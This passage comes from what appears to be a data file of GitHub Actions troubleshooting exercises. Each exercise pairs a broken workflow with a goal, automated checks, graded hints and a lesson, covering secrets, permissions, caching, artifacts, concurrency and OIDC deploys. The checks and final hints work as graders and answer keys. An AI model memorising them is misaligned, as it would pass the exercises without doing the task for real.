        ["No version is canceled", (v) => v.run(0).jobs.length === 3 && v.run(0).jobs.every((j) => j.conclusion !== "cancelled")],
        ["3.11 and 3.13 report their failures", (v) => ["3.11", "3.13"].every((p) => v.run(0).jobs.some((j) => j.name.includes(p) && j.conclusion === "failure"))],
        ["3.12 passes", (v) => v.run(0).jobs.some((j) => j.name.includes("3.12") && j.conclusion === "success")]
      ],
      hints: [
        "Open the 3.13 job: it did not fail, it was canceled. By whom?",
        "A matrix is fail-fast by default: the first failure cancels every job still running.",
        "Under `strategy:`, add `fail-fast: false`."
      ],
      lesson: "fail-fast saves minutes on pull requests; turn it off when you need every result, for example a compatibility matrix."
    },
    {
      id: "float-version", group: "Jobs and matrices", level: "04", title: "The version '3.1' was not found",
      story: "You added Python 3.10 to the matrix. That job fails, asking for a version 3.1 nobody wrote.",
      goal: "Test Python 3.9, 3.10 and 3.11.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            strategy:
              matrix:
                python: [3.9, 3.10, 3.11]
            steps:
              - uses: ${checkout}
              - uses: actions/setup-python@v6
                with:
                  python-version: \${{ matrix.python }}
              - run: python -m pytest
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["3.9, 3.10 and 3.11 all set up and pass", (v) => ["3.9", "3.10", "3.11"].every((p) => v.run(0).jobs.some((j) => j.conclusion === "success" && j.name.endsWith(`(${p})`)))]
      ],
      hints: [
        "Look at the job names: one says 3.1. Where did the 0 go?",
        "Unquoted, YAML reads 3.10 as the number 3.1.",
        'Quote the versions: `python: ["3.9", "3.10", "3.11"]`.'
      ],
      lesson: "YAML numbers drop trailing zeros. Quote version numbers in matrices and inputs."
    },
    {
      id: "runner-label", group: "Jobs and matrices", level: "05", title: "Waiting for a runner to pick up this job",
      story: "The build has said Queued for an hour. Other repositories' builds start immediately.",
      goal: "Get the job onto a runner and passing.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          build:
            runs-on: ubuntu-lastest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
      ` },
      events: ["push"], verify: ["push"],
      checks: [["The job runs and passes", (v) => ok(v.run(0))]],
      hints: [
        "Open the job: which labels did it ask for?",
        "A job waits until a runner with all its labels is free. No runner has a label that is spelt wrong, so it waits until GitHub gives up after 24 hours.",
        "Use `runs-on: ubuntu-latest`."
      ],
      lesson: "Waiting for a runner usually means no runner matches the labels: a typo, a missing self-hosted label, or an offline runner."
    },
    {
      id: "hang", group: "Jobs and matrices", level: "05", title: "The job ran for 6 hours",
      story: "The end-to-end job hung all night and was killed after six hours, using up the month's minutes.",
      goal: "Make the end-to-end tests pass, and cap the job at 30 minutes or less.",
      files: { [CI]: y`
        name: E2E
        on: push
        jobs:
          e2e:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - name: Start the app
                run: npm start
              - name: End-to-end tests
                run: npm run e2e
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The end-to-end tests pass", (v) => ok(v.run(0)) && stepRan(v.run(0), /End-to-end/)],
        ["The job has timeout-minutes of 30 or less", (v) => jobsOf(v.run(0), "e2e").every((j) => j.timeout <= 30)]
      ],
      hints: [
        "Which step never finished? What does `npm start` do when the server is up?",
        "A server runs until stopped, so the step never ends. Start it in the background with `&`. And every job should have a `timeout-minutes` far below the 360-minute default.",
        "Use `run: npm start &` and add `timeout-minutes: 15` to the job."
      ],
      lesson: "A step ends when its process exits. Background long-running servers, and set timeout-minutes so a hang costs minutes, not hours."
    },
    {
      id: "disk-full", group: "Jobs and matrices", level: "05", title: "No space left on device",
      story: "The image build has grown. Now it fails halfway with no space left on device.",
      goal: "Build the image on the GitHub-hosted runner.",
      files: { [CI]: y`
        name: Image
        on: push
        jobs:
          image:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - name: Build the image
                run: docker build -t shop:\${{ github.sha }} .
      ` },
      world: { diskGB: 14, app: { imageGB: 19 }, bloat: { "/usr/local/lib/android": 9, "/usr/share/dotnet": 3, "/opt/ghc": 5, "/opt/hostedtoolcache/CodeQL": 5 } },
      events: ["push"], verify: ["push"],
      checks: [["The image builds", (v) => ok(v.run(0)) && stepRan(v.run(0), /Build the image/)], ["No step uses continue-on-error", (v) => noCoe(v, "image")]],
      hints: [
        "Add a step `df -h` before the build to see what is free.",
        "The hosted image ships SDKs you do not use. Removing them frees space; docker system prune alone frees too little here.",
        "Add a step before the build: `run: sudo rm -rf /usr/local/lib/android /usr/share/dotnet /opt/ghc`."
      ],
      lesson: "Hosted runners have limited free disk. Remove unused toolchains, slim the build, or use a larger runner."
    },
    {
      id: "service-db", group: "Jobs and matrices", level: "05", title: "getaddrinfo EAI_AGAIN postgres",
      story: "The integration tests need Postgres. The service container starts, and the tests cannot find it.",
      goal: "Run the integration tests against the Postgres service.",
      files: { [CI]: y`
        name: Integration
        on: push
        jobs:
          integration:
            runs-on: ubuntu-latest
            services:
              postgres:
                image: postgres:17
                env:
                  POSTGRES_HOST_AUTH_METHOD: trust
                options: >-
                  --health-cmd pg_isready
                  --health-interval 5s
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run test:integration
                env:
                  DATABASE_URL: postgres://postgres@postgres:5432/shop
      ` },
      events: ["push"], verify: ["push"],
      checks: [["The integration tests pass", (v) => ok(v.run(0)) && /14 passed/.test(text(v.run(0)))]],
      hints: [
        "Where do the steps run: in a container, or on the runner itself?",
        "Steps on the runner reach a service through a port mapped to localhost; the name postgres resolves only from inside a job container.",
        "Add `ports: [\"5432:5432\"]` to the service and use `@localhost:5432` in DATABASE_URL."
      ],
      lesson: "Service containers are reached by name from a job container, and through mapped ports on localhost from the runner."
    },

    {
      id: "windows-shell", group: "Jobs and matrices", level: "05", title: "The same step fails only on Windows",
      story: "Windows was added to the build matrix. Linux passes; Windows fails in the very first command.",
      goal: "Build on Ubuntu and Windows with the same steps.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          build:
            runs-on: \${{ matrix.os }}
            strategy:
              matrix:
                os: [ubuntu-latest, windows-latest]
            steps:
              - uses: ${checkout}
              - run: npm ci
              - name: Clean and build
                run: |
                  rm -rf dist
                  npm run build
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["Ubuntu builds", (v) => v.run(0).jobs.some((j) => j.os === "Linux" && j.conclusion === "success")],
        ["Windows builds", (v) => v.run(0).jobs.some((j) => j.os === "Windows" && j.conclusion === "success")],
        ["Every command works on Windows, none silently fails", (v) => !/is not recognized|cannot be found that matches/.test(text(v.run(0)))]
      ],
      hints: [
        "Open the Windows job: which shell ran the step?",
        "On Windows the default shell is pwsh. There `rm` is Remove-Item, which has no -rf option. Git Bash is installed on Windows runners.",
        "Add `shell: bash` to the step, or `defaults:` / `run:` / `shell: bash` for the whole job."
      ],
      lesson: "Windows runners default to pwsh. Set shell: bash for portable scripts, or write them for each shell."
    },
    // --- Secrets and permissions ---------------------------------------------------------
    {
      id: "dependabot-secret", group: "Secrets and permissions", level: "06", title: "Secrets are empty on Dependabot pull requests",
      story: "Every Dependabot pull request fails at Upload coverage. The same workflow passes on your own pull requests.",
      goal: "Dependabot pull requests pass and still upload coverage; nothing else changes.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
          pull_request:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
              - name: Upload coverage
                run: ./scripts/upload-coverage.sh
                env:
                  COVERAGE_TOKEN: \${{ secrets.COVERAGE_TOKEN }}
      ` },
      world: { secrets: { COVERAGE_TOKEN: "cov-5d0a71e2b9" } },
      events: ["dependabot", "pr"], verify: ["dependabot", "pr"],
      checks: [
        ["A Dependabot pull request uploads coverage and passes", (v) => ok(v.run(0)) && /report uploaded/.test(text(v.run(0)))],
        ["Your own pull requests still upload coverage", (v) => /report uploaded/.test(text(v.run(1)))]
      ],
      hints: [
        "Open Set up job on the Dependabot run: what is the secret source?",
        "Workflows started by Dependabot read Dependabot secrets, a separate store, and get a read-only token. Setting the Actions secret again changes nothing.",
        "In the gh console below, run `gh secret set COVERAGE_TOKEN --app dependabot --body cov-5d0a71e2b9`, then run the Dependabot event again."
      ],
      lesson: "Dependabot pull requests are treated like forks: only Dependabot secrets, a read-only token. Store what they need there."
    },
    {
      id: "fork-secret", group: "Secrets and permissions", level: "06", title: "Secret is empty on a fork pull request",
      story: "Every pull request from outside contributors fails at Upload coverage. Your own pull requests pass.",
      goal: "Fork pull requests run the tests and pass; pushes to main still upload coverage.",
      files: { [CI]: y`
        name: CI
        on:
          push:
            branches: [main]
          pull_request:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
              - name: Upload coverage
                run: ./scripts/upload-coverage.sh
                env:
                  COVERAGE_TOKEN: \${{ secrets.COVERAGE_TOKEN }}
      ` },
      world: { secrets: { COVERAGE_TOKEN: "cov-5d0a71e2b9" } },
      events: ["fork", "push"], verify: ["fork", "push"],
      checks: [
        ["A fork pull request runs the tests and passes", (v) => ok(v.run(0)) && stepRan(v.run(0), /npm test/)],
        ["A push to main uploads coverage", (v) => /report uploaded/.test(text(v.run(1)))],
        ["No step uses continue-on-error", (v) => noCoe(v, "test")]
      ],
      hints: [
        "Compare the Set up job step of a fork pull request with a push: what is the secret source?",
        "GitHub does not pass secrets to workflows triggered from forks. Steps that need them must be skipped there. `secrets` cannot be used in `if:`.",
        "Add `if: github.event_name == 'push'` to the Upload coverage step."
      ],
      lesson: "Fork pull requests get no secrets and a read-only token. Skip secret-dependent steps for them instead of making secrets reachable."
    },
    {
      id: "pr-comment", group: "Secrets and permissions", level: "07", title: "Resource not accessible by integration",
      story: "The bundle-size bot should comment on each pull request. It fails with an error about an integration.",
      goal: "Post the comment, with the least permissions that allow it.",
      files: { [CI]: y`
        name: Bundle size
        on: pull_request
        permissions:
          contents: read
        jobs:
          size:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
              - name: Comment
                run: |
                  gh pr comment \${{ github.event.pull_request.number }} --body "Bundle size: 142 kB"
                env:
                  GH_TOKEN: \${{ github.token }}
      ` },
      events: ["pr"], verify: ["pr"],
      checks: [
        ["The comment is posted", (v) => ok(v.run(0)) && !!v.run(0).effects.commented],
        ["Only pull-requests (or issues) is write", (v) => jobsOf(v.run(0), "size").every((j) => writes(j).every((k) => k === "pull-requests" || k === "issues"))]
      ],
      hints: [
        "Open the Set up job step: it lists what the GITHUB_TOKEN can do. Is commenting there?",
        "\"Resource not accessible by integration\" means the token lacks a permission. A PR comment needs pull-requests: write.",
        "Under `permissions:`, add `pull-requests: write` and keep `contents: read`."
      ],
      lesson: "The GITHUB_TOKEN gets only the permissions you list. Add the one scope the job needs, not write-all."
    },
    {
      id: "ghcr-push", group: "Secrets and permissions", level: "07", title: "denied: permission_denied: write_package",
      story: "The image builds and logs in to GitHub Container Registry, then the push is denied.",
      goal: "Push the image with the GITHUB_TOKEN and least privilege.",
      files: { [CI]: y`
        name: Image
        on:
          push:
            branches: [main]
        permissions:
          contents: read
        jobs:
          image:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: echo "\${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u \${{ github.actor }} --password-stdin
              - run: docker build -t ghcr.io/nimbus/shop:\${{ github.sha }} .
              - run: docker push ghcr.io/nimbus/shop:\${{ github.sha }}
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The image is pushed", (v) => ok(v.run(0)) && !!v.run(0).effects.pushedImage],
        ["Only packages is write", (v) => jobsOf(v.run(0), "image").every((j) => writes(j).every((k) => k === "packages"))]
      ],
      hints: [
        "Logging in worked; pushing did not. Which permission does writing a package need?",
        "The token can read packages by default. Pushing needs packages: write.",
        "Add `packages: write` under `permissions:`."
      ],
      lesson: "The GITHUB_TOKEN can publish to GHCR when the workflow grants packages: write. No personal token needed."
    },
    {
      id: "env-secret", group: "Secrets and permissions", level: "06", title: "Environment secret is empty",
      story: "The deploy token was moved into the production environment's secrets. The deploy now says the token is empty.",
      goal: "Deploy using the production environment's secret.",
      files: { [CI]: y`
        name: Deploy
        on:
          push:
            branches: [main]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { environments: { production: { secrets: deployToken, branches: ["main"] } } },
      events: ["push"], verify: ["push"],
      checks: [
        ["Production is deployed", (v) => deployedTo(v.run(0), "production")],
        ["The job uses the production environment", (v) => jobsOf(v.run(0), "deploy").every((j) => j.environment === "production")]
      ],
      hints: [
        "The secret exists, but in an environment. When does a job get an environment's secrets?",
        "Only jobs that name the environment with `environment:` receive its secrets and its protection rules.",
        "Add `environment: production` to the deploy job."
      ],
      lesson: "Environment secrets reach only jobs that declare the environment, which is what lets protection rules guard them."
    },
    {
      id: "write-all", group: "Secrets and permissions", level: "07", title: "permissions: write-all on a lint job",
      story: "A security review flags the lint workflow: its token can push code, publish packages and approve pull requests.",
      goal: "Keep lint passing with a read-only token.",
      files: { [CI]: y`
        name: Lint
        on: [push, pull_request]
        permissions: write-all
        jobs:
          lint:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run lint
      ` },
      world: { repo: { permissive: true } },
      events: ["push"], verify: ["push"],
      checks: [
        ["Lint passes", (v) => ok(v.run(0))],
        ["The token has no write permission", (v) => v.run(0).jobs.every((j) => !writes(j).length)]
      ],
      hints: [
        "Open Set up job: every scope is write. What does lint actually need?",
        "Lint only reads the code. Without a permissions block, this older repository's default token can write everything too.",
        "Replace `write-all` with a block: `permissions:` and `contents: read`."
      ],
      lesson: "Declare permissions in every workflow, starting from contents: read. A stolen read-only token can do little."
    },

    {
      id: "secret-output", group: "Secrets and permissions", level: "04", title: "Skip output since it may contain secret",
      story: "The registry's host name is stored as a secret. Since then, deploy gets an empty image name and the build job shows a warning about skipping an output.",
      goal: "Deploy the image the build job named, without printing or leaking the secret.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          build:
            runs-on: ubuntu-latest
            outputs:
              image: \${{ steps.meta.outputs.image }}
            steps:
              - id: meta
                run: echo "image=\${{ secrets.REGISTRY }}/shop:1.4.\${{ github.run_number }}" >> "$GITHUB_OUTPUT"
          deploy:
            needs: build
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  IMAGE: \${{ needs.build.outputs.image }}
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: { ...deployToken, REGISTRY: "registry.nimbus.example" }, app: { needsImage: true } },
      events: ["push"], verify: ["push"],
      checks: [
        ["Production is deployed with an image", (v) => deployedTo(v.run(0), "production")],
        ["No output is skipped", (v) => !v.run(0).annotations.some((a) => /Skip output/.test(a[1]))],
        ["No secret leaks", (v) => !v.run(0).effects.leaks.length]
      ],
      hints: [
        "Read the warning on the build job. Why would GitHub drop an output?",
        "Job outputs that contain a secret's value are not passed on. Pass only the non-secret part, and add the secret where it is used.",
        "Output just the tag (`tag=1.4.${{ github.run_number }}`), and in deploy set `IMAGE: ${{ secrets.REGISTRY }}/shop:${{ needs.build.outputs.tag }}`. Or keep the host in a variable: `vars.REGISTRY`."
      ],
      lesson: "Outputs containing secrets are dropped with a warning. Keep non-sensitive settings in variables, and pass secrets only where they are used."
    },
    {
      id: "rate-limit", group: "Secrets and permissions", level: "07", title: "API rate limit exceeded for installation",
      story: "The weekly pull request report collected titles one request at a time. With 1,500 pull requests it now fails two thirds of the way through.",
      goal: "Report all 1,500 pull requests with the GITHUB_TOKEN.",
      files: { [CI]: y`
        name: PR report
        on:
          workflow_dispatch:
          schedule:
            - cron: "10 6 * * 1"
        permissions:
          contents: read
          pull-requests: read
        jobs:
          report:
            runs-on: ubuntu-latest
            timeout-minutes: 30
            steps:
              - name: Collect pull request titles
                run: |
                  for n in $(seq 1 1500); do
                    gh api "repos/nimbus/shop/pulls/$n" --jq .title >> titles.txt
                  done
                  echo "Pull requests: $(wc -l < titles.txt)"
                env:
                  GH_TOKEN: \${{ github.token }}
      ` },
      world: { app: { prCount: 1500 } },
      events: ["dispatch"], verify: ["dispatch"],
      checks: [["The report counts 1500 pull requests", (v) => /Pull requests: 1500/.test(text(v.run(0)))], ["The run passes", (v) => ok(v.run(0))]],
      hints: [
        "How many API requests does the loop make, and what is the GITHUB_TOKEN's hourly limit?",
        "The GITHUB_TOKEN allows 1,000 REST requests an hour per repository. List endpoints return up to 100 items per request.",
        "Replace the loop with one paginated call: `gh api \"repos/nimbus/shop/pulls?state=all&per_page=100\" --paginate --jq '.[].title' > titles.txt`."
      ],
      lesson: "Batch API calls: list endpoints with per_page=100 and --paginate, or GraphQL. Sleeping in a loop only makes it slower."
    },
    // --- Caching and artifacts ---------------------------------------------------------------
    {
      id: "cache-key", group: "Caching and artifacts", level: "05", title: "Cache not found for input keys",
      story: "A cache step was added to speed up installs. Every run still says the cache was not found.",
      goal: "Restore the npm cache on the second push, and refresh it when package-lock.json changes.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: actions/cache@v5
                with:
                  path: ~/.npm
                  key: npm-\${{ github.sha }}
              - run: npm ci
              - run: npm test
      ` },
      events: ["push"], verify: ["push", "push"],
      checks: [
        ["The second push restores the cache by its exact key", (v) => v.run(1).cache.some((c) => c.hit)],
        ["The key depends on package-lock.json", (v) => /hashFiles\(\s*'(\*\*\/)?package-lock\.json'\s*\)/.test(v.files[CI])],
        ["The tests pass", (v) => ok(v.run(1))]
      ],
      hints: [
        "Run twice and compare the two keys in the cache step.",
        "github.sha changes with every commit, so every key is new. A key should change only when the dependencies do.",
        "Use `key: npm-${{ runner.os }}-${{ hashFiles('package-lock.json') }}`."
      ],
      lesson: "A cache key should describe the contents: the OS and a hash of the lockfile. Add restore-keys for a partial match."
    },
    {
      id: "pip-cache", group: "Caching and artifacts", level: "05", title: "No file matched to [**/requirements.txt]",
      story: "This is the failure in this course's own repository: Set up Python fails before any test runs.",
      goal: "Cache pip downloads and run the tests.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: actions/setup-python@v6
                with:
                  python-version: "3.13"
                  cache: pip
              - run: python -m pip install -r requirements-dev.txt
              - run: python -m pytest src/addition.py -q
      ` },
      world: { repo: { files: { "requirements-dev.txt": "pytest==8.4.2\n", "src/addition.py": "def add(a, b):\n    return a + b\n" } } },
      events: ["push"], verify: ["push", "push"],
      checks: [
        ["The tests pass", (v) => ok(v.run(0))],
        ["The second run restores the pip cache", (v) => /Cache restored from key: setup-python/.test(text(v.run(1)))]
      ],
      hints: [
        "Read the error: which file names does setup-python look for to build the cache key?",
        "With `cache: pip`, setup-python hashes requirements.txt or pyproject.toml. This project keeps its list in requirements-dev.txt.",
        "Add `cache-dependency-path: requirements-dev.txt` under `with:`."
      ],
      lesson: "setup-python and setup-node key their caches on a dependency file. Point cache-dependency-path at yours."
    },
    {
      id: "artifact-name", group: "Caching and artifacts", level: "05", title: "Unable to download artifact(s): Artifact not found",
      story: "The build job uploads the site and the deploy job downloads it. Deploy fails: the artifact is not found.",
      goal: "Deploy the site that build produced.",
      files: { [CI]: y`
        name: Site
        on:
          push:
            branches: [main]
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
              - uses: actions/upload-artifact@v6
                with:
                  name: web
                  path: dist/
          deploy:
            needs: build
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: actions/download-artifact@v7
                with:
                  name: build
                  path: dist
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, app: { needsDist: true } },
      events: ["push"], verify: ["push"],
      checks: [["Production gets the built site", (v) => deployedTo(v.run(0), "production")]],
      hints: [
        "Compare the name used to upload with the name used to download.",
        "Artifacts are found by name within the run. Without a name, download-artifact puts each artifact in a folder of its own.",
        "Download `name: web` into `path: dist`."
      ],
      lesson: "Jobs do not share files. Upload an artifact in one job and download it by the same name in a job that needs it."
    },
    {
      id: "artifact-v3", group: "Caching and artifacts", level: "05", title: "This request has been automatically failed",
      story: "An old release workflow that nobody touched for a year suddenly fails in Set up job.",
      goal: "Upload the release bundle again, on supported versions.",
      files: { [CI]: y`
        name: Bundle
        on: push
        jobs:
          bundle:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm run build
              - uses: actions/upload-artifact@v3
                with:
                  name: bundle
                  path: dist/
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["The bundle uploads", (v) => ok(v.run(0)) && /successfully uploaded/.test(text(v.run(0)))],
        ["No deprecated action versions", (v) => !v.run(0).annotations.some((a) => /deprecated/.test(a[1]))]
      ],
      hints: [
        "The error names the action and version, and links to the deprecation notice.",
        "v3 of the artifact actions was shut down. v4 changed the backend; v6 and later also run on Node.js 24.",
        "Use `actions/upload-artifact@v6`."
      ],
      lesson: "Deprecated action versions are switched off on a date. Keep actions current with Dependabot so the date passes quietly."
    },
    {
      id: "artifact-conflict", group: "Caching and artifacts", level: "05", title: "(409) Conflict: an artifact with this name already exists",
      story: "Each Node.js version uploads its coverage. Two of the three matrix jobs fail at the upload.",
      goal: "Keep a coverage artifact for each Node.js version.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            strategy:
              matrix:
                node: [20, 22, 24]
            steps:
              - uses: ${checkout}
              - uses: actions/setup-node@v6
                with:
                  node-version: \${{ matrix.node }}
              - run: npm ci
              - run: npm test -- --coverage
              - run: mkdir -p coverage && echo "SF:src/cart.js" > coverage/lcov.info
              - uses: actions/upload-artifact@v6
                with:
                  name: coverage
                  path: coverage/
      ` },
      events: ["push"], verify: ["push"],
      checks: [
        ["Every job passes", (v) => ok(v.run(0))],
        ["Three coverage artifacts exist", (v) => (text(v.run(0)).match(/has been successfully uploaded/g) || []).length === 3 && !/overwrite/.test(v.files[CI])]
      ],
      hints: [
        "All three jobs upload under the same name. What happens to the second?",
        "Since v4, artifacts are immutable and names are unique per run. Each matrix job needs its own name.",
        "Use `name: coverage-${{ matrix.node }}`."
      ],
      lesson: "Artifact names are unique within a run. Put the matrix values in the name; merge them later with download-artifact's pattern."
    },
    {
      id: "slow-build", group: "Caching and artifacts", level: "05", title: "The build takes 20 minutes",
      story: "Each push waits 20 minutes for one long test job. Developers stopped waiting for CI.",
      goal: "On the second push, finish in under 8 minutes and still run every test.",
      files: { [CI]: y`
        name: CI
        on: push
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - uses: actions/setup-node@v6
                with:
                  node-version: 24
              - run: npm ci
              - run: npm test
      ` },
      world: { app: { testSecs: 1080 } },
      events: ["push"], verify: ["push", "push"],
      checks: [
        ["Every test runs", (v) => { const s = v.run(1).effects.shards; const n = s.length && Number(s[0].split("/")[1]); return n > 0 && s.length === n && new Set(s).size === n && s.every((x) => Number(x.split("/")[1]) === n); }],
        ["The second push restores the npm cache", (v) => /Cache restored from key: node-cache/.test(text(v.run(1)))],
        ["The second push takes under 8 minutes", (v) => ok(v.run(1)) && v.run(1).duration < 480]
      ],
      hints: [
        "Open the run: where do the minutes go?",
        "Two things help: `cache: npm` on setup-node, and splitting the tests across parallel jobs with a matrix. Jest takes `--shard=1/3`.",
        "Add `cache: npm`, a matrix `shard: [1, 2, 3]`, and run `npm test -- --shard=${{ matrix.shard }}/3`."
      ],
      lesson: "Cache what you download and split what you run. Wall time is the longest job, not the total."
    },

    // --- Deployments and environments ---------------------------------------------------------
    {
      id: "stale-runs", group: "Deployments and environments", level: "08", title: "Every push to a pull request runs to the end",
      story: "Developers push to their pull requests several times an hour. Every outdated run still runs to the end, and the monthly minutes ran out on the 20th.",
      goal: "A new push to a pull request cancels the run it replaces.",
      files: { [CI]: y`
        name: CI
        on:
          pull_request:
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci
              - run: npm test
      ` },
      events: ["pr-twice", "pr"], verify: ["pr-twice"],
      checks: [
        ["The older run is canceled", (v) => v.runs[0][0].conclusion === "cancelled"],
        ["The newer run passes", (v) => ok(v.runs[0][1])]
      ],
      hints: [
        "Send two pushes to the pull request and compare the two runs.",
        "A concurrency group with `cancel-in-progress: true` cancels the older run in the same group. The group must be the same for both pushes, and different for other pull requests.",
        "Add at the top level: `concurrency:` with `group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}` and `cancel-in-progress: true`."
      ],
      lesson: "Cancel superseded pull request runs with a concurrency group per branch. It saves minutes and gets developers their result sooner."
    },
    {
      id: "concurrency", group: "Deployments and environments", level: "08", title: "Two deploys at once: the old version wins",
      story: "Two merges landed 30 seconds apart. Both deploys ran, the older one finished last, and production went back a version.",
      goal: "End on the newer version, with deploys never overlapping.",
      files: { [CI]: y`
        name: Deploy
        on:
          push:
            branches: [main]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, app: { deploySecs: { 42: 150, 43: 40 } } },
      events: ["push-twice", "push"], verify: ["push-twice"],
      checks: [
        ["Production ends on version 43", (v) => { const d = v.runs[0].flatMap((r) => r.effects.deployed); return d.length > 0 && d.reduce((a, b) => (b.at > a.at ? b : a)).version === 43; }],
        ["Deploys never overlap", (v) => { const d = v.runs[0].flatMap((r) => r.effects.deployed); return d.every((a) => d.every((b) => a === b || a.at <= b.from || b.at <= a.from)); }]
      ],
      hints: [
        "Send two pushes. Look at when each deploy starts and ends.",
        "A concurrency group lets only one run in the group go at a time; cancel-in-progress decides whether the older one is canceled or finishes first.",
        "Add at the top level: `concurrency:` with `group: deploy-production` and `cancel-in-progress: false`."
      ],
      lesson: "Use a concurrency group for anything that changes shared state. For deploys, usually queue (cancel-in-progress: false); for pull request CI, cancel."
    },
    {
      id: "approval", group: "Deployments and environments", level: "08", title: "Production deploys without approval",
      story: "Production has required reviewers, yet a merge went live at 2 a.m. with nobody approving it.",
      goal: "Production deploys must wait for a reviewer's approval.",
      files: { [CI]: y`
        name: Deploy
        on:
          push:
            branches: [main]
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: ./deploy.sh production
                env:
                  DEPLOY_TOKEN: \${{ secrets.DEPLOY_TOKEN }}
      ` },
      world: { secrets: deployToken, environments: { production: { reviewers: ["release-managers"], branches: ["main"] } } },
      events: ["push"], verify: ["push"],
      checks: [
        ["The deploy waits for a reviewer", (v) => (v.run(0).effects.approvals || []).includes("production")],
        ["After approval, production is deployed", (v) => deployedTo(v.run(0), "production")]
      ],
      hints: [
        "The protection rules are on the production environment. Does the job use it?",
        "Rules apply only to jobs that declare `environment: production`.",
        "Add `environment: production` to the deploy job, then run and approve."
      ],
      lesson: "Environments carry the rules: reviewers, wait timers, allowed branches. A job that does not name one bypasses all of them."
    },
    {
      id: "oidc", group: "Deployments and environments", level: "10", title: "Not authorized to perform sts:AssumeRoleWithWebIdentity",
      story: "Long-lived AWS keys were removed in favour of OIDC. The deploy cannot get credentials.",
      goal: "Deploy to AWS with OIDC, giving the token only what it needs.",
      files: { [CI]: y`
        name: Deploy
        on:
          push:
            branches: [main]
        permissions:
          contents: read
        jobs:
          deploy:
            runs-on: ubuntu-latest
            steps:
              - uses: ${checkout}
              - run: npm ci && npm run build
              - uses: aws-actions/configure-aws-credentials@v6
                with:
                  role-to-assume: arn:aws:iam::123456789012:role/shop-deploy
                  aws-region: eu-west-1
              - run: aws s3 sync dist s3://shop-site
      ` },
      world: {
        environments: { production: { branches: ["main"] } },
        roles: { "arn:aws:iam::123456789012:role/shop-deploy": { trust: { Version: "2012-10-17", Statement: [{ Effect: "Allow", Principal: { Federated: "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
          Action: "sts:AssumeRoleWithWebIdentity", Condition: { StringEquals: { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com", "token.actions.githubusercontent.com:sub": "repo:nimbus/shop:environment:production" } } }] } } }
      },
      events: ["push"], verify: ["push"],
      checks: [
        ["The role is assumed and the site deployed", (v) => deployedTo(v.run(0), "production")],
        ["Only id-token is write", (v) => v.run(0).jobs.every((j) => writes(j).every((k) => k === "id-token"))]
      ],
      hints: [
        "Read the first message from configure-aws-credentials: which permission does it ask about?",
        "OIDC needs `id-token: write`. Then AWS compares the token's sub claim with the role's trust policy, which allows `repo:nimbus/shop:environment:production`.",
        "Add `id-token: write` under `permissions:` and `environment: production` to the job."
      ],
      lesson: "OIDC swaps a short-lived GitHub token for cloud credentials. The job needs id-token: write, and its sub claim must match the role's trust policy."
    },

    // --- Reuse ------------------------------------------------------------------------------------
    {
      id: "reusable-secrets", group: "Reuse", level: "09", title: "Reusable workflow gets empty secrets",
      story: "Deploy was moved into a reusable workflow. It runs, and the deploy token inside it is empty.",
      goal: "Deploy through the reusable workflow.",
      files: {
        [CI]: y`
          name: CI
          on:
            push:
              branches: [main]
          jobs:
            test:
              runs-on: ubuntu-latest
              steps:
                - uses: ${checkout}
                - run: npm ci
                - run: npm test
            deploy:
              needs: test
              uses: ./.github/workflows/deploy.yml
              with:
                target: production
        `,
        [DEPLOY]: y`
          name: Deploy
